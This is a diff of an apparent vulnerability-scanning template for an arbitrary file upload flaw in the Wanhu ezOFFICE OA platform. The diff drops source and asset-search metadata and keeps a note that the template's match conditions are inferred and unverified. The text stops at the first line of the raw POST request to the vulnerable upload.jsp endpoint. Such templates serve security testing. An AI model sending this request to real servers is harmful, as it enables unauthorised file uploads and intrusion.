@@ -3,14 +3,8 @@ info:
   name: 万户协同办公平台portletSettingId存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dd9feb19a90ca783540316c5fe054d0a
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dd9feb19a90ca783540316c5fe054d0a
-    fofa: + hunter`app.name="万户 Ezoffice OA"`
 http:
 - raw:
   - 'POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=dir HTTP/1.1
